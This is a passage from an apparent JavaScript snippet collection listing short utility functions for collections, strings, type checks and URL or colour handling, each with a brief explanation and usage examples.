}\n\n\u2b06 Back to top\ntruthCheckCollection\nChecks if the predicate (second argument) is truthy on all elements of a collection (first argument).\nUse Array.prototype.every() to check if each passed object has the specified property and if it returns a truthy value.\nconst truthCheckCollection = (collection, pre) => collection.every(obj => obj[pre]);\n\nExamples\ntruthCheckCollection([{ user: 'Tinky-Winky', sex: 'male' }, { user: 'Dipsy', sex: 'male' }], 'sex'); // true\n\n\u2b06 Back to top\nunflattenObject \nUnflatten an object with the paths for keys.\nUse Object.keys(obj) combined with Array.prototype.reduce() to convert flattened path node to a leaf node.\nIf the value of a key contains a dot delimiter (.), use Array.prototype.split('.'), string transformations and JSON.parse() to create an object, then Object.assign() to create the leaf node.\nOtherwise, add the appropriate key-value pair to the accumulator object.\nconst unflattenObject = obj =>\n  Object.keys(obj).reduce((acc, k) => {\n    if (k.indexOf('.') !== -1) {\n      const keys = k.split('.');\n      Object.assign(\n        acc,\n        JSON.parse(\n          '{' +\n            keys.map((v, i) => (i !== keys.length - 1 ? `\"${v}\":{` : `\"${v}\":`)).join('') +\n            obj[k] +\n            '}'.repeat(keys.length)\n        )\n      );\n    } else acc[k] = obj[k];\n    return acc;\n  }, {});\n\nExamples\nunflattenObject({ 'a.b.c': 1, d: 1 }); // { a: { b: { c: 1 } }, d: 1 }\n\n\u2b06 Back to top\n\n\ud83d\udcdc String\nbyteSize\nReturns the length of a string in bytes.\nConvert a given string to a Blob Object and find its size.\nconst byteSize = str => new Blob([str]).size;\n\nExamples\nbyteSize('\ud83d\ude00'); // 4\nbyteSize('Hello World'); // 11\n\n\u2b06 Back to top\ncapitalize\nCapitalizes the first letter of a string.\nUse array destructuring and String.prototype.toUpperCase() to capitalize first letter, ...rest to get array of characters after first letter and then Array.prototype.join('') to make it a string again.\nOmit the lowerRest parameter to keep the rest of the string intact, or set it to true to convert to lowercase.\nconst capitalize = ([first, ...rest], lowerRest = false) =>\n  first.toUpperCase() + (lowerRest ? rest.join('').toLowerCase() : rest.join(''));\n\nExamples\ncapitalize('fooBar'); // 'FooBar'\ncapitalize('fooBar', true); // 'Foobar'\n\n\u2b06 Back to top\ncapitalizeEveryWord\nCapitalizes the first letter of every word in a string.\nUse String.prototype.replace() to match the first character of each word and String.prototype.toUpperCase() to capitalize it.\nconst capitalizeEveryWord = str => str.replace(/\\b[a-z]/g, char => char.toUpperCase());\n\nExamples\ncapitalizeEveryWord('hello world!'); // 'Hello World!'\n\n\u2b06 Back to top\ncompactWhitespace\nReturns a string with whitespaces compacted.\nUse String.prototype.replace() with a regular expression to replace all occurrences of 2 or more whitespace characters with a single space.\nconst compactWhitespace = str => str.replace(/\\s{2,}/g, ' ');\n\nExamples\ncompactWhitespace('Lorem    Ipsum'); // 'Lorem Ipsum'\ncompactWhitespace('Lorem \\n Ipsum'); // 'Lorem Ipsum'\n\n\u2b06 Back to top\nCSVToArray\nConverts a comma-separated values (CSV) string to a 2D array.\nUse Array.prototype.slice() and Array.prototype.indexOf('\\n') to remove the first row (title row) if omitFirstRow is true.\nUse String.prototype.split('\\n') to create a string for each row, then String.prototype.split(delimiter) to separate the values in each row.\nOmit the second argument, delimiter, to use a default delimiter of ,.\nOmit the third argument, omitFirstRow, to include the first row (title row) of the CSV string.\nconst CSVToArray = (data, delimiter = ',', omitFirstRow = false) =>\n  data\n    .slice(omitFirstRow ? data.indexOf('\\n') + 1 : 0)\n    .split('\\n')\n    .map(v => v.split(delimiter));\n\nExamples\nCSVToArray('a,b\\nc,d'); // [['a','b'],['c','d']];\nCSVToArray('a;b\\nc;d', ';'); // [['a','b'],['c','d']];\nCSVToArray('col1,col2\\na,b\\nc,d', ',', true); // [['a','b'],['c','d']];\n\n\u2b06 Back to top\nCSVToJSON \nConverts a comma-separated values (CSV) string to a 2D array of objects.\nThe first row of the string is used as the title row.\nUse Array.prototype.slice() and Array.prototype.indexOf('\\n') and String.prototype.split(delimiter) to separate the first row (title row) into values.\nUse String.prototype.split('\\n') to create a string for each row, then Array.prototype.map() and String.prototype.split(delimiter) to separate the values in each row.\nUse Array.prototype.reduce() to create an object for each row's values, with the keys parsed from the title row.\nOmit the second argument, delimiter, to use a default delimiter of ,.\nconst CSVToJSON = (data, delimiter = ',') => {\n  const titles = data.slice(0, data.indexOf('\\n')).split(delimiter);\n  return data\n    .slice(data.indexOf('\\n') + 1)\n    .split('\\n')\n    .map(v => {\n      const values = v.split(delimiter);\n      return titles.reduce((obj, title, index) => ((obj[title] = values[index]), obj), {});\n    });\n};\n\nExamples\nCSVToJSON('col1,col2\\na,b\\nc,d'); // [{'col1': 'a', 'col2': 'b'}, {'col1': 'c', 'col2': 'd'}];\nCSVToJSON('col1;col2\\na;b\\nc;d', ';'); // [{'col1': 'a', 'col2': 'b'}, {'col1': 'c', 'col2': 'd'}];\n\n\u2b06 Back to top\ndecapitalize\nDecapitalizes the first letter of a string.\nUse array destructuring and String.toLowerCase() to decapitalize first letter, ...rest to get array of characters after first letter and then Array.prototype.join('') to make it a string again.\nOmit the upperRest parameter to keep the rest of the string intact, or set it to true to convert to uppercase.\nconst decapitalize = ([first, ...rest], upperRest = false) =>\n  first.toLowerCase() + (upperRest ? rest.join('').toUpperCase() : rest.join(''));\n\nExamples\ndecapitalize('FooBar'); // 'fooBar'\ndecapitalize('FooBar', true); // 'fOOBAR'\n\n\u2b06 Back to top\nescapeHTML\nEscapes a string for use in HTML.\nUse String.prototype.replace() with a regexp that matches the characters that need to be escaped, using a callback function to replace each character instance with its associated escaped character using a dictionary (object).\nconst escapeHTML = str =>\n  str.replace(\n    /[&<>'\"]/g,\n    tag =>\n      ({\n        '&': '&amp;',\n        '<': '&lt;',\n        '>': '&gt;',\n        \"'\": '&#39;',\n        '\"': '&quot;'\n      }[tag] || tag)\n  );\n\nExamples\nescapeHTML('<a href=\"#\">Me & you</a>'); // '&lt;a href=&quot;#&quot;&gt;Me &amp; you&lt;/a&gt;'\n\n\u2b06 Back to top\nescapeRegExp\nEscapes a string to use in a regular expression.\nUse String.prototype.replace() to escape special characters.\nconst escapeRegExp = str => str.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');\n\nExamples\nescapeRegExp('(test)'); // \\\\(test\\\\)\n\n\u2b06 Back to top\nfromCamelCase\nConverts a string from camelcase.\nUse String.prototype.replace() to remove underscores, hyphens, and spaces and convert words to camelcase.\nOmit the second argument to use a default separator of _.\nconst fromCamelCase = (str, separator = '_') =>\n  str\n    .replace(/([a-z\\d])([A-Z])/g, '$1' + separator + '$2')\n    .replace(/([A-Z]+)([A-Z][a-z\\d]+)/g, '$1' + separator + '$2')\n    .toLowerCase();\n\nExamples\nfromCamelCase('someDatabaseFieldName', ' '); // 'some database field name'\nfromCamelCase('someLabelThatNeedsToBeCamelized', '-'); // 'some-label-that-needs-to-be-camelized'\nfromCamelCase('someJavascriptProperty', '_'); // 'some_javascript_property'\n\n\u2b06 Back to top\nindentString\nIndents each line in the provided string.\nUse String.replace and a regular expression to add the character specified by indent count times at the start of each line.\nOmit the third parameter, indent, to use a default indentation character of ' '.\nconst indentString = (str, count, indent = ' ') => str.replace(/^/gm, indent.repeat(count));\n\nExamples\nindentString('Lorem\\nIpsum', 2); // '  Lorem\\n  Ipsum'\nindentString('Lorem\\nIpsum', 2, '_'); // '__Lorem\\n__Ipsum'\n\n\u2b06 Back to top\nisAbsoluteURL\nReturns true if the given string is an absolute URL, false otherwise.\nUse a regular expression to test if the string is an absolute URL.\nconst isAbsoluteURL = str => /^[a-z][a-z0-9+.-]*:/.test(str);\n\nExamples\nisAbsoluteURL('https://google.com'); // true\nisAbsoluteURL('ftp://www.myserver.net'); // true\nisAbsoluteURL('/foo/bar'); // false\n\n\u2b06 Back to top\nisAnagram\nChecks if a string is an anagram of another string (case-insensitive, ignores spaces, punctuation and special characters).\nUse String.toLowerCase(), String.prototype.replace() with an appropriate regular expression to remove unnecessary characters, String.prototype.split(''), Array.prototype.sort() and Array.prototype.join('') on both strings to normalize them, then check if their normalized forms are equal.\nconst isAnagram = (str1, str2) => {\n  const normalize = str =>\n    str\n      .toLowerCase()\n      .replace(/[^a-z0-9]/gi, '')\n      .split('')\n      .sort()\n      .join('');\n  return normalize(str1) === normalize(str2);\n};\n\nExamples\nisAnagram('iceman', 'cinema'); // true\n\n\u2b06 Back to top\nisLowerCase\nChecks if a string is lower case.\nConvert the given string to lower case, using String.toLowerCase() and compare it to the original.\nconst isLowerCase = str => str === str.toLowerCase();\n\nExamples\nisLowerCase('abc'); // true\nisLowerCase('a3@$'); // true\nisLowerCase('Ab4'); // false\n\n\u2b06 Back to top\nisUpperCase\nChecks if a string is upper case.\nConvert the given string to upper case, using String.prototype.toUpperCase() and compare it to the original.\nconst isUpperCase = str => str === str.toUpperCase();\n\nExamples\nisUpperCase('ABC'); // true\nisLowerCase('A3@$'); // true\nisLowerCase('aB4'); // false\n\n\u2b06 Back to top\nmapString\nCreates a new string with the results of calling a provided function on every character in the calling string.\nUse String.prototype.split('') and Array.prototype.map() to call the provided function, fn, for each character in str.\nUse Array.prototype.join('') to recombine the array of characters into a string.\nThe callback function, fn, takes three arguments (the current character, the index of the current character and the string mapString was called upon).\nconst mapString = (str, fn) =>\n  str\n    .split('')\n    .map((c, i) => fn(c, i, str))\n    .join('');\n\nExamples\nmapString('lorem ipsum', c => c.toUpperCase()); // 'LOREM IPSUM'\n\n\u2b06 Back to top\nmask\nReplaces all but the last num of characters with the specified mask character.\nUse String.prototype.slice() to grab the portion of the characters that will remain unmasked and use String.padStart() to fill the beginning of the string with the mask character up to the original length.\nOmit the second argument, num, to keep a default of 4 characters unmasked. If num is negative, the unmasked characters will be at the start of the string.\nOmit the third argument, mask, to use a default character of '*' for the mask.\nconst mask = (cc, num = 4, mask = '*') => `${cc}`.slice(-num).padStart(`${cc}`.length, mask);\n\nExamples\nmask(1234567890); // '******7890'\nmask(1234567890, 3); // '*******890'\nmask(1234567890, -4, '$'); // '$$$$567890'\n\n\u2b06 Back to top\npad\nPads a string on both sides with the specified character, if it's shorter than the specified length.\nUse String.padStart() and String.padEnd() to pad both sides of the given string.\nOmit the third argument, char, to use the whitespace character as the default padding character.\nconst pad = (str, length, char = ' ') =>\n  str.padStart((str.length + length) / 2, char).padEnd(length, char);\n\nExamples\npad('cat', 8); // '  cat   '\npad(String(42), 6, '0'); // '004200'\npad('foobar', 3); // 'foobar'\n\n\u2b06 Back to top\npalindrome\nReturns true if the given string is a palindrome, false otherwise.\nConvert the string to String.prototype.toLowerCase() and use String.prototype.replace() to remove non-alphanumeric characters from it.\nThen, use the spread operator (...) to split the string into individual characters, Array.prototype.reverse(), String.prototype.join('') and compare it to the original, unreversed string, after converting it to String.prototype.toLowerCase().\nconst palindrome = str => {\n  const s = str.toLowerCase().replace(/[\\W_]/g, '');\n  return s === [...s].reverse().join('');\n};\n\nExamples\npalindrome('taco cat'); // true\n\n\u2b06 Back to top\npluralize\nReturns the singular or plural form of the word based on the input number. If the first argument is an object, it will use a closure by returning a function that can auto-pluralize words that don't simply end in s if the supplied dictionary contains the word.\nIf num is either -1 or 1, return the singular form of the word. If num is any other number, return the plural form. Omit the third argument to use the default of the singular word + s, or supply a custom pluralized word when necessary. If the first argument is an object, utilize a closure by returning a function which can use the supplied dictionary to resolve the correct plural form of the word.\nconst pluralize = (val, word, plural = word + 's') => {\n  const _pluralize = (num, word, plural = word + 's') =>\n    [1, -1].includes(Number(num)) ? word : plural;\n  if (typeof val === 'object') return (num, word) => _pluralize(num, word, val[word]);\n  return _pluralize(val, word, plural);\n};\n\nExamples\npluralize(0, 'apple'); // 'apples'\npluralize(1, 'apple'); // 'apple'\npluralize(2, 'apple'); // 'apples'\npluralize(2, 'person', 'people'); // 'people'\n\nconst PLURALS = {\n  person: 'people',\n  radius: 'radii'\n};\nconst autoPluralize = pluralize(PLURALS);\nautoPluralize(2, 'person'); // 'people'\n\n\u2b06 Back to top\nremoveNonASCII\nRemoves non-printable ASCII characters.\nUse a regular expression to remove non-printable ASCII characters.\nconst removeNonASCII = str => str.replace(/[^\\x20-\\x7E]/g, '');\n\nExamples\nremoveNonASCII('\u00e4\u00c4\u00e7\u00c7\u00e9\u00c9\u00ealorem-ipsum\u00f6\u00d6\u00d0\u00fe\u00fa\u00da'); // 'lorem-ipsum'\n\n\u2b06 Back to top\nreverseString\nReverses a string.\nUse the spread operator (...) and Array.prototype.reverse() to reverse the order of the characters in the string.\nCombine characters to get a string using String.prototype.join('').\nconst reverseString = str => [...str].reverse().join('');\n\nExamples\nreverseString('foobar'); // 'raboof'\n\n\u2b06 Back to top\nsortCharactersInString\nAlphabetically sorts the characters in a string.\nUse the spread operator (...), Array.prototype.sort() and  String.localeCompare() to sort the characters in str, recombine using String.prototype.join('').\nconst sortCharactersInString = str => [...str].sort((a, b) => a.localeCompare(b)).join('');\n\nExamples\nsortCharactersInString('cabbage'); // 'aabbceg'\n\n\u2b06 Back to top\nsplitLines\nSplits a multiline string into an array of lines.\nUse String.prototype.split() and a regular expression to match line breaks and create an array.\nconst splitLines = str => str.split(/\\r?\\n/);\n\nExamples\nsplitLines('This\\nis a\\nmultiline\\nstring.\\n'); // ['This', 'is a', 'multiline', 'string.' , '']\n\n\u2b06 Back to top\nstringPermutations \n\u26a0\ufe0f WARNING: This function's execution time increases exponentially with each character. Anything more than 8 to 10 characters will cause your browser to hang as it tries to solve all the different combinations.\nGenerates all permutations of a string (contains duplicates).\nUse recursion.\nFor each letter in the given string, create all the partial permutations for the rest of its letters.\nUse Array.prototype.map() to combine the letter with each partial permutation, then Array.prototype.reduce() to combine all permutations in one array.\nBase cases are for string length equal to 2 or 1.\nconst stringPermutations = str => {\n  if (str.length <= 2) return str.length === 2 ? [str, str[1] + str[0]] : [str];\n  return str\n    .split('')\n    .reduce(\n      (acc, letter, i) =>\n        acc.concat(stringPermutations(str.slice(0, i) + str.slice(i + 1)).map(val => letter + val)),\n      []\n    );\n};\n\nExamples\nstringPermutations('abc'); // ['abc','acb','bac','bca','cab','cba']\n\n\u2b06 Back to top\nstripHTMLTags\nRemoves HTML/XML tags from string.\nUse a regular expression to remove HTML/XML tags from a string.\nconst stripHTMLTags = str => str.replace(/<[^>]*>/g, '');\n\nExamples\nstripHTMLTags('<p><em>lorem</em> <strong>ipsum</strong></p>'); // 'lorem ipsum'\n\n\u2b06 Back to top\ntoCamelCase\nConverts a string to camelcase.\nBreak the string into words and combine them capitalizing the first letter of each word, using a regexp.\nconst toCamelCase = str => {\n  let s =\n    str &&\n    str\n      .match(/[A-Z]{2,}(?=[A-Z][a-z]+[0-9]*|\\b)|[A-Z]?[a-z]+[0-9]*|[A-Z]|[0-9]+/g)\n      .map(x => x.slice(0, 1).toUpperCase() + x.slice(1).toLowerCase())\n      .join('');\n  return s.slice(0, 1).toLowerCase() + s.slice(1);\n};\n\nExamples\ntoCamelCase('some_database_field_name'); // 'someDatabaseFieldName'\ntoCamelCase('Some label that needs to be camelized'); // 'someLabelThatNeedsToBeCamelized'\ntoCamelCase('some-javascript-property'); // 'someJavascriptProperty'\ntoCamelCase('some-mixed_string with spaces_underscores-and-hyphens'); // 'someMixedStringWithSpacesUnderscoresAndHyphens'\n\n\u2b06 Back to top\ntoKebabCase\nConverts a string to kebab case.\nBreak the string into words and combine them adding - as a separator, using a regexp.\nconst toKebabCase = str =>\n  str &&\n  str\n    .match(/[A-Z]{2,}(?=[A-Z][a-z]+[0-9]*|\\b)|[A-Z]?[a-z]+[0-9]*|[A-Z]|[0-9]+/g)\n    .map(x => x.toLowerCase())\n    .join('-');\n\nExamples\ntoKebabCase('camelCase'); // 'camel-case'\ntoKebabCase('some text'); // 'some-text'\ntoKebabCase('some-mixed_string With spaces_underscores-and-hyphens'); // 'some-mixed-string-with-spaces-underscores-and-hyphens'\ntoKebabCase('AllThe-small Things'); // \"all-the-small-things\"\ntoKebabCase('IAmListeningToFMWhileLoadingDifferentURLOnMyBrowserAndAlsoEditingSomeXMLAndHTML'); // \"i-am-listening-to-fm-while-loading-different-url-on-my-browser-and-also-editing-xml-and-html\"\n\n\u2b06 Back to top\ntoSnakeCase\nConverts a string to snake case.\nBreak the string into words and combine them adding _ as a separator, using a regexp.\nconst toSnakeCase = str =>\n  str &&\n  str\n    .match(/[A-Z]{2,}(?=[A-Z][a-z]+[0-9]*|\\b)|[A-Z]?[a-z]+[0-9]*|[A-Z]|[0-9]+/g)\n    .map(x => x.toLowerCase())\n    .join('_');\n\nExamples\ntoSnakeCase('camelCase'); // 'camel_case'\ntoSnakeCase('some text'); // 'some_text'\ntoSnakeCase('some-mixed_string With spaces_underscores-and-hyphens'); // 'some_mixed_string_with_spaces_underscores_and_hyphens'\ntoSnakeCase('AllThe-small Things'); // \"all_the_smal_things\"\ntoSnakeCase('IAmListeningToFMWhileLoadingDifferentURLOnMyBrowserAndAlsoEditingSomeXMLAndHTML'); // \"i_am_listening_to_fm_while_loading_different_url_on_my_browser_and_also_editing_some_xml_and_html\"\n\n\u2b06 Back to top\ntoTitleCase\nConverts a string to title case.\nBreak the string into words, using a regexp, and combine them capitalizing the first letter of each word and adding a whitespace between them.\nconst toTitleCase = str =>\n  str\n    .match(/[A-Z]{2,}(?=[A-Z][a-z]+[0-9]*|\\b)|[A-Z]?[a-z]+[0-9]*|[A-Z]|[0-9]+/g)\n    .map(x => x.charAt(0).toUpperCase() + x.slice(1))\n    .join(' ');\n\nExamples\ntoTitleCase('some_database_field_name'); // 'Some Database Field Name'\ntoTitleCase('Some label that needs to be title-cased'); // 'Some Label That Needs To Be Title Cased'\ntoTitleCase('some-package-name'); // 'Some Package Name'\ntoTitleCase('some-mixed_string with spaces_underscores-and-hyphens'); // 'Some Mixed String With Spaces Underscores And Hyphens'\n\n\u2b06 Back to top\ntruncateString\nTruncates a string up to a specified length.\nDetermine if the string's length is greater than num.\nReturn the string truncated to the desired length, with '...' appended to the end or the original string.\nconst truncateString = (str, num) =>\n  str.length > num ? str.slice(0, num > 3 ? num - 3 : num) + '...' : str;\n\nExamples\ntruncateString('boomerang', 7); // 'boom...'\n\n\u2b06 Back to top\nunescapeHTML\nUnescapes escaped HTML characters.\nUse String.prototype.replace() with a regex that matches the characters that need to be unescaped, using a callback function to replace each escaped character instance with its associated unescaped character using a dictionary (object).\nconst unescapeHTML = str =>\n  str.replace(\n    /&amp;|&lt;|&gt;|&#39;|&quot;/g,\n    tag =>\n      ({\n        '&amp;': '&',\n        '&lt;': '<',\n        '&gt;': '>',\n        '&#39;': \"'\",\n        '&quot;': '\"'\n      }[tag] || tag)\n  );\n\nExamples\nunescapeHTML('&lt;a href=&quot;#&quot;&gt;Me &amp; you&lt;/a&gt;'); // '<a href=\"#\">Me & you</a>'\n\n\u2b06 Back to top\nURLJoin \nJoins all given URL segments together, then normalizes the resulting URL.\nUse String.prototype.join('/') to combine URL segments, then a series of String.prototype.replace() calls with various regexps to normalize the resulting URL (remove double slashes, add proper slashes for protocol, remove slashes before parameters, combine parameters with '&' and normalize first parameter delimiter).\nconst URLJoin = (...args) =>\n  args\n    .join('/')\n    .replace(/[\\/]+/g, '/')\n    .replace(/^(.+):\\//, '$1://')\n    .replace(/^file:/, 'file:/')\n    .replace(/\\/(\\?|&|#[^!])/g, '$1')\n    .replace(/\\?/g, '&')\n    .replace('&', '?');\n\nExamples\nURLJoin('http://www.google.com', 'a', '/b/cd', '?foo=123', '?bar=foo'); // 'http://www.google.com/a/b/cd?foo=123&bar=foo'\n\n\u2b06 Back to top\nwords\nConverts a given string into an array of words.\nUse String.prototype.split() with a supplied pattern (defaults to non-alpha as a regexp) to convert to an array of strings. Use Array.prototype.filter() to remove any empty strings.\nOmit the second argument to use the default regexp.\nconst words = (str, pattern = /[^a-zA-Z-]+/) => str.split(pattern).filter(Boolean);\n\nExamples\nwords('I love javaScript!!'); // [\"I\", \"love\", \"javaScript\"]\nwords('python, javaScript & coffee'); // [\"python\", \"javaScript\", \"coffee\"]\n\n\u2b06 Back to top\n\n\ud83d\udcc3 Type\ngetType\nReturns the native type of a value.\nReturns lowercased constructor name of value, \"undefined\" or \"null\" if value is undefined or null.\nconst getType = v =>\n  v === undefined ? 'undefined' : v === null ? 'null' : v.constructor.name.toLowerCase();\n\nExamples\ngetType(new Set([1, 2, 3])); // 'set'\n\n\u2b06 Back to top\nis\nChecks if the provided value is of the specified type.\nEnsure the value is not undefined or null using Array.prototype.includes(), and compare the constructor property on the value with type to check if the provided value is of the specified type.\nconst is = (type, val) => ![, null].includes(val) && val.constructor === type;\n\nExamples\nis(Array, [1]); // true\nis(ArrayBuffer, new ArrayBuffer()); // true\nis(Map, new Map()); // true\nis(RegExp, /./g); // true\nis(Set, new Set()); // true\nis(WeakMap, new WeakMap()); // true\nis(WeakSet, new WeakSet()); // true\nis(String, ''); // true\nis(String, new String('')); // true\nis(Number, 1); // true\nis(Number, new Number(1)); // true\nis(Boolean, true); // true\nis(Boolean, new Boolean(true)); // true\n\n\u2b06 Back to top\nisArrayLike\nChecks if the provided argument is array-like (i.e. is iterable).\nCheck if the provided argument is not null and that its Symbol.iterator property is a function.\nconst isArrayLike = obj => obj != null && typeof obj[Symbol.iterator] === 'function';\n\nExamples\nisArrayLike(document.querySelectorAll('.className')); // true\nisArrayLike('abc'); // true\nisArrayLike(null); // false\n\n\u2b06 Back to top\nisBoolean\nChecks if the given argument is a native boolean element.\nUse typeof to check if a value is classified as a boolean primitive.\nconst isBoolean = val => typeof val === 'boolean';\n\nExamples\nisBoolean(null); // false\nisBoolean(false); // true\n\n\u2b06 Back to top\nisEmpty\nReturns true if the a value is an empty object, collection, has no enumerable properties or is any type that is not considered a collection.\nCheck if the provided value is null or if its length is equal to 0.\nconst isEmpty = val => val == null || !(Object.keys(val) || val).length;\n\nExamples\nisEmpty([]); // true\nisEmpty({}); // true\nisEmpty(''); // true\nisEmpty([1, 2]); // false\nisEmpty({ a: 1, b: 2 }); // false\nisEmpty('text'); // false\nisEmpty(123); // true - type is not considered a collection\nisEmpty(true); // true - type is not considered a collection\n\n\u2b06 Back to top\nisFunction\nChecks if the given argument is a function.\nUse typeof to check if a value is classified as a function primitive.\nconst isFunction = val => typeof val === 'function';\n\nExamples\nisFunction('x'); // false\nisFunction(x => x); // true\n\n\u2b06 Back to top\nisNil\nReturns true if the specified value is null or undefined, false otherwise.\nUse the strict equality operator to check if the value and of val are equal to null or undefined.\nconst isNil = val => val === undefined || val === null;\n\nExamples\nisNil(null); // true\nisNil(undefined); // true\n\n\u2b06 Back to top\nisNull\nReturns true if the specified value is null, false otherwise.\nUse the strict equality operator to check if the value and of val are equal to null.\nconst isNull = val => val === null;\n\nExamples\nisNull(null); // true\n\n\u2b06 Back to top\nisNumber\nChecks if the given argument is a number.\nUse typeof to check if a value is classified as a number primitive.\nTo safeguard against NaN, check if val === val (as NaN has a typeof equal to number and is the only value not equal to itself).\nconst isNumber = val => typeof val === 'number' && val === val;\n\nExamples\nisNumber(1); // true\nisNumber('1'); // false\nisNumber(NaN); // false\n\n\u2b06 Back to top\nisObject\nReturns a boolean determining if the passed value is an object or not.\nUses the  Object constructor to create an object wrapper for the given value.\nIf the value is null or undefined, create and return an empty object. \u039ftherwise, return an object of a type that corresponds to the given value.\nconst isObject = obj => obj === Object(obj);\n\nExamples\nisObject([1, 2, 3, 4]); // true\nisObject([]); // true\nisObject(['Hello!']); // true\nisObject({ a: 1 }); // true\nisObject({}); // true\nisObject(true); // false\n\n\u2b06 Back to top\nisObjectLike\nChecks if a value is object-like.\nCheck if the provided value is not null and its typeof is equal to 'object'.\nconst isObjectLike = val => val !== null && typeof val === 'object';\n\nExamples\nisObjectLike({}); // true\nisObjectLike([1, 2, 3]); // true\nisObjectLike(x => x); // false\nisObjectLike(null); // false\n\n\u2b06 Back to top\nisPlainObject\nChecks if the provided value is an object created by the Object constructor.\nCheck if the provided value is truthy, use typeof to check if it is an object and Object.constructor to make sure the constructor is equal to Object.\nconst isPlainObject = val => !!val && typeof val === 'object' && val.constructor === Object;\n\nExamples\nisPlainObject({ a: 1 }); // true\nisPlainObject(new Map()); // false\n\n\u2b06 Back to top\nisPrimitive\nReturns a boolean determining if the passed value is primitive or not.\nCreate an object from val and compare it with val to determine if the passed value is primitive (i.e. not equal to the created object).\nconst isPrimitive = val => Object(val) !== val;\n\nExamples\nisPrimitive(null); // true\nisPrimitive(50); // true\nisPrimitive('Hello!'); // true\nisPrimitive(false); // true\nisPrimitive(Symbol()); // true\nisPrimitive([]); // false\n\n\u2b06 Back to top\nisPromiseLike\nReturns true if an object looks like a Promise, false otherwise.\nCheck if the object is not null, its typeof matches either object or function and if it has a .then property, which is also a function.\nconst isPromiseLike = obj =>\n  obj !== null &&\n  (typeof obj === 'object' || typeof obj === 'function') &&\n  typeof obj.then === 'function';\n\nExamples\nisPromiseLike({\n  then: function() {\n    return '';\n  }\n}); // true\nisPromiseLike(null); // false\nisPromiseLike({}); // false\n\n\u2b06 Back to top\nisString\nChecks if the given argument is a string. Only works for string primitives.\nUse typeof to check if a value is classified as a string primitive.\nconst isString = val => typeof val === 'string';\n\nExamples\nisString('10'); // true\n\n\u2b06 Back to top\nisSymbol\nChecks if the given argument is a symbol.\nUse typeof to check if a value is classified as a symbol primitive.\nconst isSymbol = val => typeof val === 'symbol';\n\nExamples\nisSymbol(Symbol('x')); // true\n\n\u2b06 Back to top\nisUndefined\nReturns true if the specified value is undefined, false otherwise.\nUse the strict equality operator to check if the value and of val are equal to undefined.\nconst isUndefined = val => val === undefined;\n\nExamples\nisUndefined(undefined); // true\n\n\u2b06 Back to top\nisValidJSON\nChecks if the provided string is a valid JSON.\nUse JSON.parse() and a try... catch block to check if the provided string is a valid JSON.\nconst isValidJSON = str => {\n  try {\n    JSON.parse(str);\n    return true;\n  } catch (e) {\n    return false;\n  }\n};\n\nExamples\nisValidJSON('{\"name\":\"Adam\",\"age\":20}'); // true\nisValidJSON('{\"name\":\"Adam\",age:\"20\"}'); // false\nisValidJSON(null); // true\n\n\u2b06 Back to top\n\n\ud83d\udd27 Utility\ncastArray\nCasts the provided value as an array if it's not one.\nUse Array.prototype.isArray() to determine if val is an array and return it as-is or encapsulated in an array accordingly.\nconst castArray = val => (Array.isArray(val) ? val : [val]);\n\nExamples\ncastArray('foo'); // ['foo']\ncastArray([1]); // [1]\n\n\u2b06 Back to top\ncloneRegExp\nClones a regular expression.\nUse new RegExp(), RegExp.source and RegExp.flags to clone the given regular expression.\nconst cloneRegExp = regExp => new RegExp(regExp.source, regExp.flags);\n\nExamples\nconst regExp = /lorem ipsum/gi;\nconst regExp2 = cloneRegExp(regExp); // /lorem ipsum/gi\n\n\u2b06 Back to top\ncoalesce\nReturns the first non-null/undefined argument.\nUse Array.prototype.find() to return the first non null/undefined argument.\nconst coalesce = (...args) => args.find(_ => ![undefined, null].includes(_));\n\nExamples\ncoalesce(null, undefined, '', NaN, 'Waldo'); // \"\"\n\n\u2b06 Back to top\ncoalesceFactory\nReturns a customized coalesce function that returns the first argument that returns true from the provided argument validation function.\nUse Array.prototype.find() to return the first argument that returns true from the provided argument validation function.\nconst coalesceFactory = valid => (...args) => args.find(valid);\n\nExamples\nconst customCoalesce = coalesceFactory(_ => ![null, undefined, '', NaN].includes(_));\ncustomCoalesce(undefined, null, NaN, '', 'Waldo'); // \"Waldo\"\n\n\u2b06 Back to top\nextendHex\nExtends a 3-digit color code to a 6-digit color code.\nUse Array.prototype.map(), String.prototype.split() and Array.prototype.join() to join the mapped array for converting a 3-digit RGB notated hexadecimal color-code to the 6-digit form.\nArray.prototype.slice() is used to remove # from string start since it's added once.\nconst extendHex = shortHex =>\n  '#' +\n  shortHex\n    .slice(shortHex.startsWith('#') ? 1 : 0)\n    .split('')\n    .map(x => x + x)\n    .join('');\n\nExamples\nextendHex('#03f'); // '#0033ff'\nextendHex('05a'); // '#0055aa'\n\n\u2b06 Back to top\ngetURLParameters\nReturns an object containing the parameters of the current URL.\nUse String.match() with an appropriate regular expression to get all key-value pairs, Array.prototype.reduce() to map and combine them into a single object.\nPass location.search as the argument to apply to the current url.\nconst getURLParameters = url =>\n  (url.match(/([^?=&]+)(=([^&]*))/g) || []).reduce(\n    (a, v) => ((a[v.slice(0, v.indexOf('='))] = v.slice(v.indexOf('=') + 1)), a),\n    {}\n  );\n\nExamples\ngetURLParameters('http://url.com/page?name=Adam&surname=Smith'); // {name: 'Adam', surname: 'Smith'}\ngetURLParameters('google.com'); // {}\n\n\u2b06 Back to top\nhexToRGB \nConverts a color code to a rgb() or rgba() string if alpha value is provided.\nUse bitwise right-shift operator and mask bits with & (and) operator to convert a hexadecimal color code (with or without prefixed with #) to a string with the RGB values. If it's 3-digit color code, first convert to 6-digit version. If an alpha value is provided alongside 6-digit hex, give rgba() string in return.\nconst hexToRGB = hex => {\n  let alpha = false,\n    h = hex.slice(hex.startsWith('#') ? 1 : 0);\n  if (h.length === 3) h = [...h].map(x => x + x).join('');\n  else if (h.length === 8) alpha = true;\n  h = parseInt(h, 16);\n  return (\n    'rgb' +\n    (alpha ? 'a' : '') +\n    '(' +\n    (h >>> (alpha ? 24 : 16)) +\n    ', ' +\n    ((h & (alpha ? 0x00ff0000 : 0x00ff00)) >>> (alpha ? 16 : 8)) +\n    ', ' +\n    ((h & (alpha ? 0x0000ff00 : 0x0000ff)) >>> (alpha ? 8 : 0)) +\n    (alpha ? `, ${h & 0x000000ff}` : '') +\n    ')'\n  );\n};\n\nExamples\nhexToRGB('#27ae60ff'); // 'rgba(39, 174, 96, 255)'\nhexToRGB('27ae60'); // 'rgb(39, 174, 96)'\nhexToRGB('#fff'); // 'rgb(255, 255, 255)'\n\n\u2b06 Back to top\nhttpGet\nMakes a GET request to the passed URL.\nUse XMLHttpRequest web api to make a get request to the given url.\nHandle the onload event, by calling the given 